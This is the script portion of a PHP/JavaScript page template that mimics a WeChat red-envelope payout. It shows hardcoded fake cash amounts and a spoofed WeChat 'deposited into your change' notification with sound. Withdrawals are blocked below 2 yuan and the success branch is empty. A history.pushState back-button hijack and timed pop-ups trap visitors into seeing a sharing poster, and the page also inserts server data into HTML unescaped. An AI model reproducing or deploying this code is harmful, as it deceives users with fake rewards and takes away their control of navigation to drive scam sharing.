<script>
	var obj = {
		avatarSrc: '<?=$parentUser["headimgurl"]?>',
		personName: '<?=$parentUser["nickname"]?>的红包',
		redEnvelopeAmount: '0.30<span style="font-size: 14px;color:rgba(204,170,118,1);margin-left: 5px">元</span>',
		count: '<?=count($mList)?>',
		money: '0.45/1.00',
		dismantled: '<?=!$is ? 1 : 0?>',
		posterImg: '<?=$haiBao?>',
		balanceCount: '0',
		withdrawn: '0.3',
	}

	if (obj.dismantled == 0) {
		$('#dismantled').show()
	}
	$('#posterImg').attr('src', obj.posterImg)
	$('#personAvatar').attr('src', obj.avatarSrc)
	$('#personName').html(obj.personName)
	$('#redEnvelopeAmount').html(obj.redEnvelopeAmount)
	$('#count').html(obj.count)
	$('#withdrawn').html(obj.withdrawn)
	$('#money').html(obj.money)
	$('#balanceCount').html(obj.balanceCount + '<span style="font-size: 20px">元</span>')
	$('#again').click(function () {
		$('#poster').show()
	})
	$('#balance').click(function () {
		$('#balanceModal').show()
	})
	$('#getMoney').click(function () {
		$('#balanceModal').show()
	})
	$('#withdraw').click(function () { // 点击提现
		if (obj.balanceCount < 2) { // 小于两元
			$('#insufficientBalance').show(0)
			setTimeout(function (){
				$('#insufficientBalance').hide()
			}, 2000)
		} else { // 提现成功逻辑

		}
	})
	setTimeout(function (){
		$('#poster').show()
	}, 65000)
	$('#getMoney').click(function (){
		$('#balanceModal').hide()
		$('#poster').show()
	})

	function showPoster() {
		$('#poster').show()
	}

	function hidePoster() {
		$('#poster').hide()
	}

	function hideBalanceModal() {
		$('#balanceModal').hide()
	}

	goss(showPoster);

	setTimeout(function () {
		$('#dismantled').hide()
	}, 3000)
	var daoz = document.createElement("div");
	daoz.innerHTML = '<audio src="<?=$sys_template_url?>view/image/music.mp3" preload="auto" autoplay="autoplay" id="mp3"></audio><div class="daoztx hideShow" style="">' +
		'<div class="new-bg-tz"><div class="daoz_top"><div class="t_l_text"><div><img src="<?=$sys_template_url?>view/image/wei_xin.png" alt=""></div>' +
		'<div>微信·<span class="text-new">刚刚</span></div></div><div class="safe-img"><img src="<?=$sys_template_url?>view/image/safe.png" alt=""></div>' +
		'</div><div class="daoz_bottom"><div><div>微信红包</div><div class="text-ling">您获取了一个红包，已存入您的零钱</div></div>' +
		'<div class="tz_img"><img src="<?=$sys_template_url?>view/image/tongzhi.jpg" alt=""></div></div></div></div>'
	if(obj.dismantled == 1){
		document.body.appendChild(daoz);
		audioAutoPlay("mp3");
	}

	function audioAutoPlay(id) {
		var audio1 = document.getElementById(id);
		audio1.play();
		document.addEventListener("WeixinJSBridgeReady", function () {
			audio1.play();
		}, false);
	}

	setTimeout(function () {
		document.getElementsByClassName('daoztx')[0].style.visibility = 'hidden'
	}, 2000)

	var mList = JSON.parse('<?=json_encode($mList)?>');
	for (var i = 0; i < mList.length; i++) {
		var img = mList[i].mimg;
		var name = mList[i].mname;
		var sjm = mList[i].msjm;
		var sjt = mList[i].msjt;
		listDiscuss(img, name, sjm, sjt)
	}

	function listDiscuss(img, name, sjm, sjt) {
		var mhtml = '<li><div class="user_infor"><img src="' + img + '" class="head_img"><div class="user_name"><p>' + name + '<\/p><span>' + sjt + '<\/span><\/div></div><div class="money">' + sjm + '元<\/div></li>';
		$("#demoDown").append(mhtml);
	}

	function goss(callback){
		history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
		if(navigator.userAgent.indexOf('Android') != -1){
			if(typeof(tbsJs) != "undefined"){
				tbsJs.onReady('{useCachedApi : "true"}', function(e) {})
				window.onhashchange=function(){
					callback();
				};
			}else{
				var pop = 0;
				window.onhashchange = function(event) {
					pop++
					if (pop >= 3) {
						callback();
					}else{
						history.go(1)
					}
				};
				history.go(-1);
			}
		}else{
			window.onhashchange=function(){
				callback();
			};
		}
	}

	var hiddenProperty = 'hidden' in document ? 'hidden' :  'webkitHidden' in document ? 'webkitHidden' :  'mozHidden' in document ? 'mozHidden' : null;
	var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');

	document.addEventListener(visibilityChangeEvent, function(){
		if (!document[hiddenProperty]) {
			tip_show();
		}else{

		}
	});

	function tip_show(str){
		$('#tixing').show();
		if(str){
			$('#tixing .tixing_txt').text(str);
		}
		setTimeout(function(){$('#tixing').hide();}, 3000)
	}
</script>
<style>
    .hideShow {
        animation: hideShow 2s;
    }
    @keyframes hideShow {
        0%{
            transform: translateY(-120px)
        }
        25% {
            transform: translateX(0px)
        }
        50% {
            transform: translateX(0px)
        }
        75% {
            transform: translateX(0px)
        }
        100% {
            transform: translateY(-120px)
        }
    }
</style>
</body>
